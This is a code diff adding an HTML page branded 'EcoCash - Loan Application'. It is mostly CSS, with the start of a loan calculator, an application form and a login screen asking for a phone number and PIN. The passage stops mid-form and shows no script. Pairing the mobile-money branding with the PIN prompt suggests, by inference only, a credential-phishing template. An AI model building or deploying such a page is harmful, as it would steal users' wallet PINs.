@@ -1,0 +1,2055 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EcoCash - Loan Application</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #3b82f6;
+      --primary-dark: #1d4ed8;
+      --primary-light: #eff6ff;
+      --green: #10b981;
+      --orange: #f97316;
+      --dark: #1a1a1a;
+      --grey: #6b7280;
+      --grey-light: #e5e7eb;
+      --light: #f3f4f6;
+      --white: #ffffff;
+      --blue-dark: #0052cc;
+      --shadow: 0 4px 6px rgba(0,0,0,0.1);
+      --shadow-lg: 0 20px 25px rgba(0,0,0,0.15);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: var(--light);
+      color: var(--dark);
+      line-height: 1.6;
+    }
+
+    /* ═══════════════════════════════════
+       HEADER
+    ═══════════════════════════════════ */
+    header {
+      background: var(--white);
+      padding: 16px 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: var(--shadow);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .logo {
+      font-size: 24px;
+      font-weight: 900;
+      color: var(--primary);
+      letter-spacing: -1px;
+      cursor: pointer;
+      text-decoration: none;
+    }
+
+    .menu-btn {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: var(--dark);
+    }
+
+    /* ═══════════════════════════════════
+       MAIN CONTAINER
+    ═══════════════════════════════════ */
+    main {
+      min-height: 100vh;
+      padding: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .page {
+      display: none;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    .page-content {
+      background: var(--white);
+      border-radius: 16px;
+      padding: 40px 32px;
+      max-width: 600px;
+      width: 100%;
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* ═══════════════════════════════════
+       HOME PAGE
+    ═══════════════════════════════════ */
+    #home .page-content {
+      text-align: center;
+    }
+
+    .hero-title {
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 12px;
+      color: var(--dark);
+    }
+
+    .hero-subtitle {
+      font-size: 14px;
+      color: var(--grey);
+      margin-bottom: 32px;
+    }
+
+    .calculator-section {
+      background: var(--light);
+      padding: 24px;
+      border-radius: 12px;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .calc-title {
+      font-size: 16px;
+      font-weight: 700;
+      margin-bottom: 20px;
+      color: var(--dark);
+    }
+
+    .calc-field {
+      margin-bottom: 24px;
+    }
+
+    .field-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+    }
+
+    .field-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--grey);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .field-value {
+      font-size: 16px;
+      font-weight: 700;
+      color: var(--primary);
+    }
+
+    .range-slider {
+      width: 100%;
+      height: 6px;
+      border-radius: 3px;
+      background: linear-gradient(to right, var(--orange), var(--orange));
+      outline: none;
+      -webkit-appearance: none;
+      appearance: none;
+      margin-bottom: 8px;
+    }
+
+    .range-slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: var(--primary);
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(59, 130, 246, 0.4);
+    }
+
+    .range-slider::-moz-range-thumb {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: var(--primary);
+      cursor: pointer;
+      border: none;
+      box-shadow: 0 2px 8px rgba(59, 130, 246, 0.4);
+    }
+
+    .range-labels {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: var(--grey);
+      font-weight: 600;
+    }
+
+    .payment-display {
+      background: var(--primary-light);
+      padding: 16px;
+      border-radius: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .payment-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--grey);
+      text-transform: uppercase;
+    }
+
+    .payment-amount {
+      font-size: 24px;
+      font-weight: 900;
+      color: var(--primary);
+    }
+
+    .btn-apply {
+      width: 100%;
+      background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+      color: var(--white);
+      border: none;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      transition: transform 0.2s, box-shadow 0.2s;
+      margin-bottom: 24px;
+    }
+
+    .btn-apply:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 16px rgba(99, 102, 241, 0.3);
+    }
+
+    .features {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      text-align: center;
+    }
+
+    .feature {
+      padding: 12px;
+    }
+
+    .feature-icon {
+      font-size: 28px;
+      margin-bottom: 8px;
+    }
+
+    .feature-title {
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 4px;
+      color: var(--dark);
+    }
+
+    .feature-desc {
+      font-size: 11px;
+      color: var(--grey);
+    }
+
+    /* ═══════════════════════════════════
+       FORM PAGES
+    ═══════════════════════════════════ */
+    .form-header {
+      margin-bottom: 24px;
+    }
+
+    .form-title {
+      font-size: 20px;
+      font-weight: 800;
+      margin-bottom: 8px;
+      color: var(--dark);
+    }
+
+    .form-subtitle {
+      font-size: 12px;
+      color: var(--grey);
+    }
+
+    .progress-bar {
+      display: flex;
+      gap: 4px;
+      margin-bottom: 24px;
+    }
+
+    .progress-segment {
+      flex: 1;
+      height: 3px;
+      background: var(--grey-light);
+      border-radius: 2px;
+    }
+
+    .progress-segment.active {
+      background: var(--primary);
+    }
+
+    .form-group {
+      margin-bottom: 18px;
+    }
+
+    .form-label {
+      display: block;
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--grey);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+    }
+
+    .form-input,
+    .form-select,
+    .form-textarea {
+      width: 100%;
+      padding: 12px;
+      border: 2px solid var(--grey-light);
+      border-radius: 8px;
+      font-size: 14px;
+      font-family: 'Poppins', sans-serif;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .form-input:focus,
+    .form-select:focus,
+    .form-textarea:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+
+    .form-textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+    }
+
+    .phone-wrapper {
+      display: flex;
+      border: 2px solid var(--grey-light);
+      border-radius: 8px;
+      overflow: hidden;
+      transition: border-color 0.2s;
+    }
+
+    .phone-wrapper:focus-within {
+      border-color: var(--primary);
+    }
+
+    .phone-prefix {
+      padding: 12px 12px;
+      background: var(--light);
+      font-weight: 700;
+      color: var(--grey);
+      border-right: 2px solid var(--grey-light);
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .phone-input {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      font-size: 14px;
+      outline: none;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .summary-box {
+      background: var(--light);
+      padding: 16px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+
+    .summary-item {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      border-bottom: 1px solid var(--grey-light);
+      font-size: 13px;
+    }
+
+    .summary-item:last-child {
+      border-bottom: none;
+    }
+
+    .summary-label {
+      color: var(--grey);
+      font-weight: 600;
+    }
+
+    .summary-value {
+      color: var(--dark);
+      font-weight: 700;
+    }
+
+    .form-buttons {
+      display: flex;
+      gap: 12px;
+      margin-top: 24px;
+    }
+
+    .btn-prev {
+      flex: 1;
+      padding: 12px;
+      background: var(--light);
+      border: 2px solid var(--grey-light);
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      color: var(--dark);
+    }
+
+    .btn-prev:hover {
+      background: var(--grey-light);
+    }
+
+    .btn-next,
+    .btn-submit {
+      flex: 1;
+      padding: 12px;
+      background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+      color: var(--white);
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-size: 12px;
+    }
+
+    .btn-next:hover,
+    .btn-submit:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 16px rgba(99, 102, 241, 0.3);
+    }
+
+    /* ═══════════════════════════════════
+       SUCCESS PAGE
+    ═══════════════════════════════════ */
+    #success .page-content {
+      text-align: center;
+    }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background: var(--green);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 20px;
+      font-size: 40px;
+      color: var(--white);
+    }
+
+    .success-title {
+      font-size: 22px;
+      font-weight: 800;
+      margin-bottom: 12px;
+      color: var(--dark);
+    }
+
+    .success-text {
+      font-size: 14px;
+      color: var(--grey);
+      margin-bottom: 24px;
+    }
+
+    .countdown {
+      font-size: 32px;
+      font-weight: 900;
+      color: var(--primary);
+      margin-bottom: 24px;
+    }
+
+    /* ═══════════════════════════════════
+       LOGIN PAGE
+    ═══════════════════════════════════ */
+    #login {
+      background: linear-gradient(180deg, var(--white) 0%, var(--white) 60%, #0052cc 100%);
+      min-height: 100vh;
+    }
+
+    #login .page-content {
+      background: var(--white);
+      text-align: center;
+      max-width: 500px;
+    }
+
+    .login-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--dark);
+      margin-bottom: 24px;
+    }
+
+    .login-section {
+      margin-bottom: 24px;
+    }
+
+    .phone-input-wrapper {
+      display: flex;
+      border: 2px solid var(--primary);
+      border-radius: 8px;
+      overflow: hidden;
+      margin-bottom: 20px;
+    }
+
+    .phone-input-wrapper input {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      font-size: 14px;
+      outline: none;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .pin-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--grey);
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      display: block;
+    }
+
+    .pin-inputs-container {
+      display: flex;
+      gap: 8px;
+      justify-content: center;
+      margin-bottom: 12px;
+    }
+
+    .pin-input {
+      width: 50px;
+      height: 50px;
+      border: 2px solid var(--primary);
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: 700;
+      text-align: center;
+      outline: none;
+      transition: all 0.2s;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .pin-input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
+    }
+
+    .pin-input::placeholder {
+      color: var(--grey-light);
+    }
+
+    .pin-controls {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      gap: 12px;
+    }
+
+    .toggle-pin-btn {
+      background: none;
+      border: none;
+      font-size: 20px;
+      cursor: pointer;
+      padding: 8px;
+    }
+
+    .forgot-pin {
+      font-size: 12px;
+      color: var(--grey);
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+
+    .forgot-pin:hover {
+      color: var(--primary);
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
+      color: var(--white);
+      border: none;
+      border-radius: 8px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      font-size: 12px;
+      margin-bottom: 24px;
+    }
+
+    .login-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 16px rgba(99, 102, 241, 0.3);
+    }
+
+    .login-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .login-footer {
+      background: linear-gradient(180deg, transparent 0%, #0052cc 100%);
+      padding: 40px 24px 24px;
+      margin: 0 -32px -40px -32px;
+      border-radius: 0 0 16px 16px;
+      text-align: center;
+    }
+
+    .login-footer-title {
+      font-size: 12px;
+      color: var(--white);
+      margin-bottom: 16px;
+      font-weight: 600;
+    }
+
+    .login-footer-buttons {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+
+    .footer-btn {
+      padding: 10px 16px;
+      background: var(--white);
+      border: none;
+      border-radius: 6px;
+      font-size: 12px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .footer-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .version-text {
+      font-size: 11px;
+      color: var(--white);
+      margin-bottom: 8px;
+    }
+
+    .terms-text {
+      font-size: 11px;
+      color: var(--white);
+    }
+
+    .terms-text a {
+      color: var(--white);
+      text-decoration: underline;
+    }
+
+    /* ═══════════════════════════════════
+       FOOTER
+    ═══════════════════════════════════ */
+    footer {
+      text-align: center;
+      padding: 24px;
+      color: var(--grey);
+      font-size: 12px;
+      background: var(--white);
+      border-top: 1px solid var(--grey-light);
+    }
+
+    /* ═══════════════════════════════════
+       RESPONSIVE - MOBILE FIRST
+    ═══════════════════════════════════ */
+    
+    /* Extra Small Devices (< 360px) */
+    @media (max-width: 359px) {
+      body {
+        font-size: 13px;
+      }
+
+      header {
+        padding: 12px 16px;
+      }
+
+      .logo {
+        font-size: 20px;
+      }
+
+      main {
+        padding: 12px;
+      }
+
+      .page-content {
+        padding: 20px 12px;
+        border-radius: 12px;
+      }
+
+      .hero-title {
+        font-size: 18px;
+        margin-bottom: 8px;
+      }
+
+      .hero-subtitle {
+        font-size: 12px;
+        margin-bottom: 20px;
+      }
+
+      .calculator-section {
+        padding: 16px;
+        margin-bottom: 16px;
+      }
+
+      .calc-title {
+        font-size: 14px;
+        margin-bottom: 16px;
+      }
+
+      .calc-field {
+        margin-bottom: 16px;
+      }
+
+      .field-label {
+        font-size: 10px;
+      }
+
+      .field-value {
+        font-size: 14px;
+      }
+
+      .payment-display {
+        padding: 12px;
+        margin-bottom: 16px;
+      }
+
+      .payment-label {
+        font-size: 10px;
+      }
+
+      .payment-amount {
+        font-size: 18px;
+      }
+
+      .btn-apply {
+        padding: 12px;
+        font-size: 12px;
+        margin-bottom: 16px;
+      }
+
+      .features {
+        gap: 8px;
+      }
+
+      .feature {
+        padding: 8px;
+      }
+
+      .feature-icon {
+        font-size: 24px;
+        margin-bottom: 4px;
+      }
+
+      .feature-title {
+        font-size: 11px;
+        margin-bottom: 2px;
+      }
+
+      .feature-desc {
+        font-size: 9px;
+      }
+
+      .form-title {
+        font-size: 18px;
+        margin-bottom: 6px;
+      }
+
+      .form-subtitle {
+        font-size: 11px;
+      }
+
+      .progress-bar {
+        gap: 2px;
+        margin-bottom: 16px;
+      }
+
+      .progress-segment {
+        height: 2px;
+      }
+
+      .form-group {
+        margin-bottom: 14px;
+      }
+
+      .form-label {
+        font-size: 10px;
+        margin-bottom: 6px;
+      }
+
+      .form-input,
+      .form-select,
+      .form-textarea {
+        padding: 10px;
+        font-size: 13px;
+        border-radius: 6px;
+      }
+
+      .form-textarea {
+        min-height: 60px;
+      }
+
+      .form-row {
+        gap: 8px;
+      }
+
+      .phone-prefix {
+        padding: 10px 8px;
+        font-size: 12px;
+      }
+
+      .phone-input {
+        padding: 10px;
+        font-size: 13px;
+      }
+
+      .summary-box {
+        padding: 12px;
+        margin-bottom: 16px;
+      }
+
+      .summary-item {
+        padding: 8px 0;
+        font-size: 12px;
+      }
+
+      .form-buttons {
+        gap: 8px;
+        margin-top: 16px;
+      }
+
+      .btn-prev,
+      .btn-next,
+      .btn-submit {
+        padding: 10px;
+        font-size: 11px;
+        border-radius: 6px;
+      }
+
+      .success-icon {
+        width: 60px;
+        height: 60px;
+        font-size: 30px;
+        margin: 0 auto 16px;
+      }
+
+      .success-title {
+        font-size: 18px;
+        margin-bottom: 8px;
+      }
+
+      .success-text {
+        font-size: 12px;
+        margin-bottom: 16px;
+      }
+
+      .countdown {
+        font-size: 24px;
+        margin-bottom: 16px;
+      }
+
+      .pin-input {
+        width: 40px;
+        height: 40px;
+        font-size: 16px;
+      }
+
+      .pin-inputs-container {
+        gap: 6px;
+      }
+
+      .login-title {
+        font-size: 16px;
+        margin-bottom: 16px;
+      }
+    }
+
+    /* Small Devices (360px - 480px) */
+    @media (min-width: 360px) and (max-width: 480px) {
+      main {
+        padding: 16px;
+      }
+
+      .page-content {
+        padding: 24px 16px;
+        border-radius: 14px;
+      }
+
+      .hero-title {
+        font-size: 20px;
+        margin-bottom: 10px;
+      }
+
+      .hero-subtitle {
+        font-size: 13px;
+        margin-bottom: 24px;
+      }
+
+      .calculator-section {
+        padding: 18px;
+        margin-bottom: 20px;
+        border-radius: 10px;
+      }
+
+      .calc-title {
+        font-size: 15px;
+        margin-bottom: 18px;
+      }
+
+      .calc-field {
+        margin-bottom: 20px;
+      }
+
+      .field-label {
+        font-size: 11px;
+      }
+
+      .field-value {
+        font-size: 15px;
+      }
+
+      .payment-display {
+        padding: 14px;
+        margin-bottom: 20px;
+        border-radius: 8px;
+      }
+
+      .payment-label {
+        font-size: 11px;
+      }
+
+      .payment-amount {
+        font-size: 20px;
+      }
+
+      .btn-apply {
+        padding: 13px;
+        font-size: 13px;
+        margin-bottom: 20px;
+        border-radius: 8px;
+      }
+
+      .features {
+        gap: 12px;
+      }
+
+      .feature {
+        padding: 10px;
+      }
+
+      .feature-icon {
+        font-size: 26px;
+        margin-bottom: 6px;
+      }
+
+      .feature-title {
+        font-size: 12px;
+        margin-bottom: 3px;
+      }
+
+      .feature-desc {
+        font-size: 10px;
+      }
+
+      .form-title {
+        font-size: 19px;
+        margin-bottom: 8px;
+      }
+
+      .form-subtitle {
+        font-size: 12px;
+      }
+
+      .progress-bar {
+        gap: 3px;
+        margin-bottom: 20px;
+      }
+
+      .progress-segment {
+        height: 3px;
+      }
+
+      .form-group {
+        margin-bottom: 16px;
+      }
+
+      .form-label {
+        font-size: 11px;
+        margin-bottom: 8px;
+      }
+
+      .form-input,
+      .form-select,
+      .form-textarea {
+        padding: 11px;
+        font-size: 14px;
+        border-radius: 7px;
+      }
+
+      .form-textarea {
+        min-height: 70px;
+      }
+
+      .form-row {
+        gap: 10px;
+      }
+
+      .phone-prefix {
+        padding: 11px 10px;
+        font-size: 13px;
+      }
+
+      .phone-input {
+        padding: 11px;
+        font-size: 14px;
+      }
+
+      .summary-box {
+        padding: 14px;
+        margin-bottom: 18px;
+        border-radius: 8px;
+      }
+
+      .summary-item {
+        padding: 9px 0;
+        font-size: 12px;
+      }
+
+      .form-buttons {
+        gap: 10px;
+        margin-top: 20px;
+      }
+
+      .btn-prev,
+      .btn-next,
+      .btn-submit {
+        padding: 11px;
+        font-size: 12px;
+        border-radius: 7px;
+      }
+
+      .success-icon {
+        width: 70px;
+        height: 70px;
+        font-size: 35px;
+        margin: 0 auto 18px;
+      }
+
+      .success-title {
+        font-size: 20px;
+        margin-bottom: 10px;
+      }
+
+      .success-text {
+        font-size: 13px;
+        margin-bottom: 20px;
+      }
+
+      .countdown {
+        font-size: 28px;
+        margin-bottom: 20px;
+      }
+
+      .pin-input {
+        width: 45px;
+        height: 45px;
+        font-size: 18px;
+      }
+
+      .pin-inputs-container {
+        gap: 7px;
+      }
+
+      .login-title {
+        font-size: 17px;
+        margin-bottom: 18px;
+      }
+
+      .login-footer {
+        padding: 30px 16px 16px;
+        margin: 0 -16px -24px -16px;
+      }
+
+      .login-footer-buttons {
+        gap: 10px;
+      }
+
+      .footer-btn {
+        padding: 9px 14px;
+        font-size: 11px;
+      }
+    }
+
+    /* Medium Devices - Tablets (481px - 768px) */
+    @media (min-width: 481px) and (max-width: 768px) {
+      main {
+        padding: 20px;
+      }
+
+      .page-content {
+        padding: 32px 24px;
+        border-radius: 16px;
+      }
+
+      .hero-title {
+        font-size: 24px;
+        margin-bottom: 12px;
+      }
+
+      .hero-subtitle {
+        font-size: 14px;
+        margin-bottom: 28px;
+      }
+
+      .calculator-section {
+        padding: 22px;
+        margin-bottom: 24px;
+        border-radius: 12px;
+      }
+
+      .calc-title {
+        font-size: 16px;
+        margin-bottom: 20px;
+      }
+
+      .calc-field {
+        margin-bottom: 22px;
+      }
+
+      .field-label {
+        font-size: 12px;
+      }
+
+      .field-value {
+        font-size: 16px;
+      }
+
+      .payment-display {
+        padding: 16px;
+        margin-bottom: 24px;
+        border-radius: 8px;
+      }
+
+      .payment-label {
+        font-size: 12px;
+      }
+
+      .payment-amount {
+        font-size: 22px;
+      }
+
+      .btn-apply {
+        padding: 13px;
+        font-size: 14px;
+        margin-bottom: 24px;
+        border-radius: 8px;
+      }
+
+      .features {
+        gap: 14px;
+      }
+
+      .feature {
+        padding: 12px;
+      }
+
+      .feature-icon {
+        font-size: 28px;
+        margin-bottom: 8px;
+      }
+
+      .feature-title {
+        font-size: 13px;
+        margin-bottom: 4px;
+      }
+
+      .feature-desc {
+        font-size: 11px;
+      }
+
+      .form-title {
+        font-size: 20px;
+        margin-bottom: 8px;
+      }
+
+      .form-subtitle {
+        font-size: 13px;
+      }
+
+      .progress-bar {
+        gap: 4px;
+        margin-bottom: 24px;
+      }
+
+      .progress-segment {
+        height: 3px;
+      }
+
+      .form-group {
+        margin-bottom: 18px;
+      }
+
+      .form-label {
+        font-size: 12px;
+        margin-bottom: 8px;
+      }
+
+      .form-input,
+      .form-select,
+      .form-textarea {
+        padding: 12px;
+        font-size: 14px;
+        border-radius: 8px;
+      }
+
+      .form-textarea {
+        min-height: 80px;
+      }
+
+      .form-row {
+        gap: 12px;
+      }
+
+      .phone-prefix {
+        padding: 12px 12px;
+        font-size: 13px;
+      }
+
+      .phone-input {
+        padding: 12px;
+        font-size: 14px;
+      }
+
+      .summary-box {
+        padding: 16px;
+        margin-bottom: 20px;
+        border-radius: 8px;
+      }
+
+      .summary-item {
+        padding: 10px 0;
+        font-size: 13px;
+      }
+
+      .form-buttons {
+        gap: 12px;
+        margin-top: 24px;
+      }
+
+      .btn-prev,
+      .btn-next,
+      .btn-submit {
+        padding: 12px;
+        font-size: 13px;
+        border-radius: 8px;
+      }
+
+      .success-icon {
+        width: 75px;
+        height: 75px;
+        font-size: 38px;
+        margin: 0 auto 20px;
+      }
+
+      .success-title {
+        font-size: 21px;
+        margin-bottom: 12px;
+      }
+
+      .success-text {
+        font-size: 14px;
+        margin-bottom: 24px;
+      }
+
+      .countdown {
+        font-size: 30px;
+        margin-bottom: 24px;
+      }
+
+      .pin-input {
+        width: 50px;
+        height: 50px;
+        font-size: 18px;
+      }
+
+      .pin-inputs-container {
+        gap: 8px;
+      }
+
+      .login-title {
+        font-size: 18px;
+        margin-bottom: 20px;
+      }
+
+      .login-footer {
+        padding: 35px 24px 20px;
+        margin: 0 -24px -32px -24px;
+      }
+
+      .login-footer-buttons {
+        gap: 12px;
+      }
+
+      .footer-btn {
+        padding: 10px 16px;
+        font-size: 12px;
+      }
+    }
+
+    /* Large Devices - Desktop (769px+) */
+    @media (min-width: 769px) {
+      main {
+        padding: 24px;
+      }
+
+      .page-content {
+        padding: 40px 32px;
+        border-radius: 16px;
+        max-width: 700px;
+      }
+
+      .hero-title {
+        font-size: 28px;
+        margin-bottom: 12px;
+      }
+
+      .hero-subtitle {
+        font-size: 14px;
+        margin-bottom: 32px;
+      }
+
+      .calculator-section {
+        padding: 24px;
+        margin-bottom: 24px;
+        border-radius: 12px;
+      }
+
+      .calc-title {
+        font-size: 16px;
+        margin-bottom: 20px;
+      }
+
+      .calc-field {
+        margin-bottom: 24px;
+      }
+
+      .field-label {
+        font-size: 12px;
+      }
+
+      .field-value {
+        font-size: 16px;
+      }
+
+      .payment-display {
+        padding: 16px;
+        margin-bottom: 24px;
+        border-radius: 8px;
+      }
+
+      .payment-label {
+        font-size: 12px;
+      }
+
+      .payment-amount {
+        font-size: 24px;
+      }
+
+      .btn-apply {
+        padding: 14px;
+        font-size: 14px;
+        margin-bottom: 24px;
+        border-radius: 8px;
+      }
+
+      .btn-apply:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 16px rgba(99, 102, 241, 0.3);
+      }
+
+      .features {
+        gap: 16px;
+      }
+
+      .feature {
+        padding: 12px;
+      }
+
+      .feature-icon {
+        font-size: 28px;
+        margin-bottom: 8px;
+      }
+
+      .feature-title {
+        font-size: 13px;
+        margin-bottom: 4px;
+      }
+
+      .feature-desc {
+        font-size: 11px;
+      }
+
+      .form-title {
+        font-size: 20px;
+        margin-bottom: 8px;
+      }
+
+      .form-subtitle {
+        font-size: 12px;
+      }
+
+      .progress-bar {
+        gap: 4px;
+        margin-bottom: 24px;
+      }
+
+      .progress-segment {
+        height: 3px;
+      }
+
+      .form-group {
+        margin-bottom: 18px;
+      }
+
+      .form-label {
+        font-size: 11px;
+        margin-bottom: 8px;
+      }
+
+      .form-input,
+      .form-select,
+      .form-textarea {
+        padding: 12px;
+        font-size: 14px;
+        border-radius: 8px;
+      }
+
+      .form-textarea {
+        min-height: 80px;
+      }
+
+      .form-row {
+        gap: 12px;
+      }
+
+      .phone-prefix {
+        padding: 12px 12px;
+        font-size: 13px;
+      }
+
+      .phone-input {
+        padding: 12px;
+        font-size: 14px;
+      }
+
+      .summary-box {
+        padding: 16px;
+        margin-bottom: 20px;
+        border-radius: 8px;
+      }
+
+      .summary-item {
+        padding: 10px 0;
+        font-size: 13px;
+      }
+
+      .form-buttons {
+        gap: 12px;
+        margin-top: 24px;
+      }
+
+      .btn-prev,
+      .btn-next,
+      .btn-submit {
+        padding: 12px;
+        font-size: 12px;
+        border-radius: 8px;
+      }
+
+      .btn-next:hover,
+      .btn-submit:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 16px rgba(99, 102, 241, 0.3);
+      }
+
+      .success-icon {
+        width: 80px;
+        height: 80px;
+        font-size: 40px;
+        margin: 0 auto 20px;
+      }
+
+      .success-title {
+        font-size: 22px;
+        margin-bottom: 12px;
+      }
+
+      .success-text {
+        font-size: 14px;
+        margin-bottom: 24px;
+      }
+
+      .countdown {
+        font-size: 32px;
+        margin-bottom: 24px;
+      }
+
+      .pin-input {
+        width: 50px;
+        height: 50px;
+        font-size: 18px;
+      }
+
+      .pin-inputs-container {
+        gap: 8px;
+      }
+
+      .login-title {
+        font-size: 18px;
+        margin-bottom: 24px;
+      }
+
+      .login-footer {
+        padding: 40px 32px 24px;
+        margin: 0 -32px -40px -32px;
+      }
+
+      .login-footer-buttons {
+        gap: 12px;
+      }
+
+      .footer-btn {
+        padding: 10px 16px;
+        font-size: 12px;
+      }
+    }
+
+    /* Extra Large Devices (1200px+) */
+    @media (min-width: 1200px) {
+      .page-content {
+        max-width: 800px;
+      }
+
+      .hero-title {
+        font-size: 32px;
+      }
+
+      .form-title {
+        font-size: 24px;
+      }
+
+      .features {
+        gap: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <a href="#" class="logo" onclick="goHome(event)">EcoCash</a>
+  <button class="menu-btn">☰</button>
+</header>
+
+<!-- MAIN CONTENT -->
+<main>
+
+  <!-- PAGE: HOME -->
+  <div id="home" class="page active">
+    <div class="page-content">
+      <h1 class="hero-title">Get Your Loan Approved Fast</h1>
+      <p class="hero-subtitle">Quick approval • Competitive rates • Flexible terms</p>
+
+      <div class="calculator-section">
+        <h3 class="calc-title">Loan Calculator</h3>
+
+        <div class="calc-field">
+          <div class="field-header">
+            <span class="field-label">Loan Amount</span>
+            <span class="field-value">$<span id="amountDisplay">5,000</span></span>
+          </div>
+          <input type="range" id="amountSlider" class="range-slider" min="100" max="50000" value="5000" oninput="updateAmount(this.value)">
+          <div class="range-labels">
+            <span>$100</span>
+            <span>$50,000</span>
+          </div>
+        </div>
+
+        <div class="calc-field">
+          <div class="field-header">
+            <span class="field-label">Loan Term</span>
+            <span class="field-value"><span id="termDisplay">12</span> months</span>
+          </div>
+          <input type="range" id="termSlider" class="range-slider" min="6" max="60" value="12" oninput="updateTerm(this.value)">
+          <div class="range-labels">
+            <span>6 months</span>
+            <span>60 months</span>
+          </div>
+        </div>
+
+        <div class="payment-display">
+          <span class="payment-label">Monthly Payment</span>
+          <span class="payment-amount">$<span id="paymentDisplay">450.00</span></span>
+        </div>
+      </div>
+
+      <button class="btn-apply" onclick="goToStep1()">APPLY NOW</button>
+
+      <div class="features">
+        <div class="feature">
+          <div class="feature-icon">⚡</div>
+          <div class="feature-title">Fast Approval</div>
+          <div class="feature-desc">Within 24 hours</div>
+        </div>
+        <div class="feature">
+          <div class="feature-icon">💰</div>
+          <div class="feature-title">Low Rates</div>
+          <div class="feature-desc">From 8%</div>
+        </div>
+        <div class="feature">
+          <div class="feature-icon">🔒</div>
+          <div class="feature-title">Secure</div>
+          <div class="feature-desc">Bank-level</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE: STEP 1 - LOAN APPLICATION -->
+  <div id="step1" class="page">
+    <div class="page-content">
+      <div class="form-header">
+        <h2 class="form-title">Loan Application</h2>
+        <p class="form-subtitle">Step 1 of 3</p>
+      </div>
+
+      <div class="progress-bar">
+        <div class="progress-segment active"></div>
+        <div class="progress-segment"></div>
+        <div class="progress-segment"></div>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label">Loan Type</label>
